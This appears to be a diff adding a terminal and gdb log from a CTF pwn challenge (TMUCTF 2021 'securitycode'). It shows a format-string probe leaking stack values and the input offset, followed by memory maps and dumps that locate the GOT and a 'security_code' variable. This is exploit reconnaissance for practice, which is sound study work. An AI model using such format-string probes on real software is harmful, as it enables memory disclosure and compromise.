@@ -1,0 +1,49 @@
+mito@ubuntu:~/CTF/TMUCTF_2021/Pwn_Security_Code$ ./securitycode 
+=========================================================================
+=     _____  _      _     ____  _____  _____   ____  ____  ____  _      =
+=    /__ __\/ \__/|/ \ /\/   _\/__ __\/    /  /_   \/  _ \/_   \/ \     =
+=      / \  | |\/||| | |||  /    / \  |  __\   /   /| / \| /   /| |     =
+=      | |  | |  ||| \_/||  \__  | |  | |     /   /_| \_/|/   /_| |     =
+=      \_/  \_/  \|\____/\____/  \_/  \_/     \____/\____/\____/\_/     =
+=                                                                       =
+=========================================================================
+
+Are you an admin or a user?
+Enter 'A' for admin and 'U' for user.
+A
+Enter you name:
+AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
+Hello our dear admin, AAAA,(nil),0xf7e3911b,0x80493e4,0xf7fab000,0x804c000,0xffffcfe8,0x80495f1,0xffffcbdc,0x400,0xf7fab5c0,0x804952e,0x1,0x1,0x417dc8,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c
+mito@ubuntu:~/CTF/TMUCTF_2021/Pwn_Security_Code$
+
+gdb-peda$ vmmap
+Start      End        Perm	Name
+0x08048000 0x08049000 r--p	/home/mito/CTF/TMUCTF_2021/Pwn_Security_Code/securitycode
+0x08049000 0x0804a000 r-xp	/home/mito/CTF/TMUCTF_2021/Pwn_Security_Code/securitycode
+0x0804a000 0x0804b000 r--p	/home/mito/CTF/TMUCTF_2021/Pwn_Security_Code/securitycode
+0x0804b000 0x0804c000 r--p	/home/mito/CTF/TMUCTF_2021/Pwn_Security_Code/securitycode
+0x0804c000 0x0804d000 rw-p	/home/mito/CTF/TMUCTF_2021/Pwn_Security_Code/securitycode
+0x0804d000 0x0806e000 rw-p	[heap]
+0xf7dd3000 0xf7fa8000 r-xp	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fa8000 0xf7fa9000 ---p	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fa9000 0xf7fab000 r--p	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fab000 0xf7fac000 rw-p	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fac000 0xf7faf000 rw-p	mapped
+0xf7fcf000 0xf7fd1000 rw-p	mapped
+0xf7fd1000 0xf7fd4000 r--p	[vvar]
+0xf7fd4000 0xf7fd6000 r-xp	[vdso]
+0xf7fd6000 0xf7ffc000 r-xp	/lib/i386-linux-gnu/ld-2.27.so
+0xf7ffc000 0xf7ffd000 r--p	/lib/i386-linux-gnu/ld-2.27.so
+0xf7ffd000 0xf7ffe000 rw-p	/lib/i386-linux-gnu/ld-2.27.so
+0xfffdd000 0xffffe000 rw-p	[stack]
+gdb-peda$ Quit
+gdb-peda$ x/80wx 0x0804c000
+0x804c000:	0x0804bf08	0xf7ffd940	0xf7feadd0	0xf7e41900
+0x804c010:	0xf7e24430	0xf7e39110	0x08049070	0xf7e3aca0
+0x804c020:	0x08049090	0xf7debe30	0x080490b0	0x080490c0
+0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
+
+gdb-peda$ x/30wx $ebx+0x3c
+0x804c03c <security_code>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804c04c:	0x00000000	0x00000000	0x00000000	0x000000
